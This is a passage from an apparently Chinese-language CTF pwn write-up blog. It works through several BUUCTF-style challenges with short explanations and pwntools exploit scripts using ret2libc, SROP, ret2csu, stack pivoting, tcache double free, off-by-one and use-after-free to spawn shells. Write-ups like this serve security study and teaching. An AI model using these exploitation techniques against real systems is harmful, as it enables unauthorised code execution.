class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;tion: &#x27;</span>)</span><br><span class="line">free = u32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;free&#x27;</span>,free)</span><br><span class="line">system,binsh = ret2libc(free, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">4</span>,p32(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>


<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>本题代码很少，注意到<code>gadgets</code>函数中有<code>mov rax, 0Fh</code>和<code>mov rax, 3Bh</code>可以控制<code>rax</code>，它们恰好分别对应系统调用<code>sigreturn</code>和<code>execve</code>。因此本题可以围绕这两个系统调用给出两种做法。</p>
<p>比较难的做法是利用<code>execve</code>，我们希望执行<code>execve(&#39;/bin/sh&#39;,0,0)</code>，那么还需要控制<code>rdi,rsi,rdx</code>。这里需要几个 gadgets，但是<code>gadgets</code>函数中的不够用，所以可以<code>ret2csu</code>。<code>/bin/sh</code>需要我们自己写，但只能写到栈上，因此需要通过<code>write</code>泄露栈地址。</p>
<p>我们输入的内容位于<code>rbp-0x10</code>，那么填充 16 字节后填充<code>main</code>函数地址即可重启程序同时泄露栈地址，gdb 调试可知泄露位置距离我们的输入偏移量为<code>0x118</code>字节。</p>
<p>最后在栈上布置好<code>/bin/sh</code>字符串和<code>pop_rdi</code>的 gadget，准备好<code>rax</code>，返回到 csu 末尾确保<code>rbx=0</code>且<code>rbp=1</code>，将栈上<code>pop rdi</code>的地址给<code>r12</code>以便调用，随后设置<code>rsi,rdx</code>为 0，最后将<code>/bin/sh</code>的地址给<code>rdi</code>，调用<code>syscall</code>即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line">mov_rax_3b = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">csu_1 = <span class="number">0x400580</span></span><br><span class="line">csu_2 = <span class="number">0x40059a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span> + p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">stack = uu64(r(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;/bin/sh\x00&#x27;</span>,pop_rdi,mov_rax_3b,csu_2,<span class="number">0</span>,<span class="number">1</span>,stack<span class="number">-0x18</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,csu_1,pop_rdi,stack<span class="number">-0x20</span>,syscall)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<p>第二种方法则是 SROP。我们利用<code>mov rax, 0Fh</code>控制<code>rax</code>为 15，随后调用<code>syscall</code>，相当于执行了一次<code>sigreturn</code>。可以伪造 sigreturn frame 来执行<code>execve(&#39;/bin/sh&#39;,0,0)</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line">mov_rax_0f = <span class="number">0x4004da</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span> + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">stack = uu64(p.r(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = stack</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>,mov_rax_0f,syscall) + <span class="built_in">str</span>(frame)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>发现<code>main</code>里有<code>system</code>，然后还找到了<code>/bin/sh</code>字符串和<code>pop rdi</code>的 gadget，那就老办法传参就行了，就是 getshell 之后需要找一下 flag 的位置。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,pop_rdi,binsh,elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><p>本题先会让用户设置读入数据长度，如果大于 32 则退出。由于它自己实现的<code>get_n</code>函数第二个参数是<code>unsigned int</code>，很容易想到使用整数溢出来绕过这个限制，因此可以输入<code>-1</code>产生栈溢出漏洞。然后 ret2libc 就好。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;data!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">you_said_s = <span class="number">0x80486f8</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>),elf.plt[<span class="string">&#x27;printf&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>],you_said_s,elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;You said: &#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;You said: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf = u32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;printf&#x27;</span>,printf)</span><br><span class="line">system,binsh = ret2libc(printf,<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;data!&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>),system,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,binsh)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>这题要求字符串<code>s</code>以<code>crackme\x00</code>开头，随后会执行<code>memcpy</code>将我们的输入复制到一个<code>dest</code>位置。我们通过 gdb 调试可以测出其距离 ebp 距离为 22，要覆盖到返回地址则需要 26 字节。至于返回地址，题目提供了字符串<code>s</code>的地址，但是直接以它作为返回地址会失败，gdb 调试到<code>vuln</code>函数中的<code>ret</code>语句的时候会发现，返回地址位于<code>0xffca41dc</code>，而我们写入的数据位于<code>0xffca41c0</code>，相差<code>0x1c</code>，因此还需要考虑该偏移量。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">ss = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;ss&#x27;</span>,ss)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;crashme\x00&#x27;</span>.ljust(<span class="number">26</span>,<span class="string">&#x27;\x00&#x27;</span>) + p32(ss<span class="number">-0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>本题有<code>GetFlag</code>的后门，有一个<code>memcpy</code>的操作，此时需要关注的偏移实际上是<code>dest</code>到<code>ebp</code>的距离。管理员密码可直接通过反编译得到。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">binsh = <span class="number">0x80482ea</span></span><br><span class="line">sla(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Exit\n:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>),elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,binsh)</span><br><span class="line">sla(<span class="string">&#x27;info:&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">&#x27;Exit\n:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><p>题目给定了libc，结合题目名可以想到ret2libc，这里只能调用<code>printf</code>来打印函数GOT地址，其余和常规ret2libc相同。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,pop_rdi,elf.got[<span class="string">&#x27;read&#x27;</span>],elf.plt[<span class="string">&#x27;printf&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">sla(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">read = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;read&#x27;</span>, read)</span><br><span class="line">system, binsh = ret2libc(read, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,pop_rdi,binsh,system,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sla(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>本题没有开启任何保护，因此方法多样，例如ret2libc：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, <span class="string">&#x27;merc&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400713</span></span><br><span class="line"><span class="comment">#ret = 0x4004c9</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,pop_rdi,elf.got[<span class="string">&#x27;read&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">&#x27;me?\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">read = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;read&#x27;</span>,read)</span><br><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, <span class="string">&#x27;merc&#x27;</span>)</span><br><span class="line">system, binsh = ret2libc(read,<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,pop_rdi,binsh,system,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sla(<span class="string">&#x27;me?\n&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>

<p>或者更简单的ret2shellcode：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, asm(shellcraft.sh()))</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,<span class="number">0x601080</span>)</span><br><span class="line">ru(<span class="string">&#x27;me?\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<p>由于远程libc版本和本地二进制文件的版本不同，打远程时推荐使用ret2shellcode，感觉这个更接近预期解。</p>
<h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h2><p>提供了libc，发现是2.27版本的，考虑和tcache利用有关。</p>
<p>程序提供了<code>add</code>和<code>remove</code>两个功能，首先<code>add</code>只能创建小于0x78字节的chunk，且最多创建0x18个chunk。<code>gift</code>会返回分配到的内存地址。而在<code>remove</code>中，<code>free</code>之后没有将指针置null，存在double free。</p>
<p>由于题目给了libc，我们希望能泄露libc地址，这就需要tcache中某节点的fd指向libc。而我们知道，unsorted bin指向<code>main_arena</code>的指针是指向libc的，那么能不能把这个指针给tcache中某节点的fd呢？</p>
<p>由于0x78字节的限制我们无法直接创建适合放入unsorted bin中的chunk，因此需要先合并小堆块，然后修改<code>chunk0</code>的<code>chunk_size</code>把他变成一个大堆块。那么如何修改这个<code>chunk_size</code>字段？这就需要用到double free，假设我们连续申请堆块申请到了<code>chunk11</code>：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk0 = add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	add(<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：第二次分配了0x18字节是64位下最小分配大小。这个<code>chunk1</code>的分配是为了让unsorted bin与tcache错位。</p>
</blockquote>
<p>那么这时连续两次<code>free</code>掉<code>chunk11</code>，再<code>add</code>回来，使得<code>chunk11-&gt;fd = chunk0-0x10</code>，那么我们就在<code>chunk0-0x10</code>处伪造了一个堆块，再次<code>add</code>就会分配到<code>chunk0-0x10</code>，此时填入准备好的<code>prev_size</code>及<code>chunk_size</code>即可修改<code>chunk0</code>大小。注意为了确保释放后进入unsorted bin，<code>chunk_size</code>需大于0x400字节。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">remove(<span class="number">11</span>)</span><br><span class="line">remove(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(chunk0<span class="number">-0x10</span>)) <span class="comment"># chunk11-&gt;fd = chunk0-0x10</span></span><br><span class="line">add(<span class="number">0x78</span>,p64(chunk0<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x4a1</span>))</span><br></pre></td></tr></table></figure>

<p>随后我们释放<code>chunk0</code>就会进入unsorted bin，而释放<code>chunk1</code>会进入<code>tcache[0]</code>。此时<code>add</code>就会得到<code>chunk0</code>，并使得<code>chunk1-&gt;fd = main_arena</code>，那么接下来一次<code>add</code>得到<code>chunk1</code>，下一次<code>add</code>得到<code>main_arena</code>，减去偏移量即libc基址。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">remove(<span class="number">0</span>) <span class="comment"># unsorted bin</span></span><br><span class="line">remove(<span class="number">1</span>) <span class="comment"># tcache[0]</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment"># chunk0; chunk1-&gt;fd = main_arena</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># chunk1</span></span><br><span class="line">main_arena = add(<span class="number">0x18</span>)</span><br><span class="line">base = main_arena - <span class="number">0x3ebca0</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>, base)</span><br></pre></td></tr></table></figure>

<p>最后再次利用double free，用<code>one_gadget</code>覆盖<code>free_hook</code>，再次调用<code>remove</code>即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">free_hook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = base + <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">remove(<span class="number">18</span>)</span><br><span class="line">remove(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x28</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x28</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x28</span>, p64(one_gadget))</span><br><span class="line">remove(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>只能溢出8字节，空间太小，因此考虑栈迁移。如下布置栈：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ret addr</span><br><span class="line">ebp-0x2c</span><br><span class="line">padding</span><br><span class="line">&#x2F;sh\x00</span><br><span class="line">&#x2F;bin</span><br><span class="line">ebp-0x1c</span><br><span class="line">padding</span><br><span class="line">system</span><br><span class="line">padding</span><br><span class="line">ebp-0x24</span><br><span class="line">padding</span><br><span class="line">padding</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sa(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = uu32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;ebp&#x27;</span>, ebp)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,ebp<span class="number">-0x24</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,ebp<span class="number">-0x1c</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,ebp<span class="number">-0x2c</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>

<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p>本题在<code>write</code>时存在off_by_one漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果编辑时输入的<code>size</code>比创建时的<code>size</code>大10，就可以多输入一个字节。这多出来的一个字节可以覆盖到下一个chunk的<code>chunk_size</code>字段，从而修改其大小，造成堆块重叠。</p>
<p>首先连续创建5个<code>chunk</code>，其中第0个的大小必须以<code>8</code>结尾，否则只能溢出到<code>prev_size</code>而不是<code>chunk_size</code>。编辑0中数据，触发off_by_one条件溢出修改1的大小。随后<code>free(1)</code>使其对应大小的chunk进入unsorted bin，此时2的fd即指向<code>main_arena+88</code>，从而可以泄露libc。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x58</span>) <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x58</span>+<span class="number">10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+<span class="string">&#x27;\xe1&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">2</span>) <span class="comment"># 2</span></span><br><span class="line">ru(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">main_arena = uu64(r(<span class="number">6</span>)) - <span class="number">88</span></span><br><span class="line">base = main_arena - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>, base)</span><br></pre></td></tr></table></figure>

<p>接下来先绕过fastbin的大小检查，随后向fd写入<code>malloc_hook</code>上方的地址后申请回来，从申请到的地址出发填充11字节后即可用<code>one_gadget</code>覆盖<code>__malloc_hook</code>。但是需要注意的是<code>one_gadget</code>的约束条件得不到满足，因此需要先执行<code>__libc_realloc</code>对rsp进行调整。最后用<code>one_gadget</code>覆盖<code>__realloc_hook</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 5 (2)</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># bypass fastbin check</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,p64(main_arena<span class="number">-0x33</span>)) <span class="comment"># above malloc_hook</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 6</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xb</span>,base+<span class="number">0x4526a</span>,base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>本题<code>do_new</code>函数先创建<code>0xc</code>的chunk，包含填充的数字、对数字的打印函数和释放函数；而如果申请的是<code>string</code>类型，且长度不超过<code>0x400</code>的话，随后还会创建一个新的chunk，包含字符串内容、对字符串的打印函数和释放函数。</p>
<p>而在<code>do_del</code>中，<code>free</code>后没有清空指针，存在uaf。因此可以先申请两个堆块（总大小大于<code>0xc</code>）然后依次释放，再申请一个大小为<code>0xc</code>的堆块。那么此时先会拿出<code>chunk1</code>的<code>0xc</code>这一块，再拿出<code>chunk0</code>的<code>0xc</code>这一块，后者是我们可写的。</p>
<p>通过逆向可知结构体偏移0处是打印函数、偏移4处是释放函数，释放函数的参数是结构体指针本身。那么我们将<code>chunk0</code>的打印函数写成<code>sh\x00\x00</code>（注意4字节），释放函数用<code>system</code>覆盖，释放时就会执行<code>system(&quot;sh&quot;)</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="built_in">len</span>,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	sla(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span 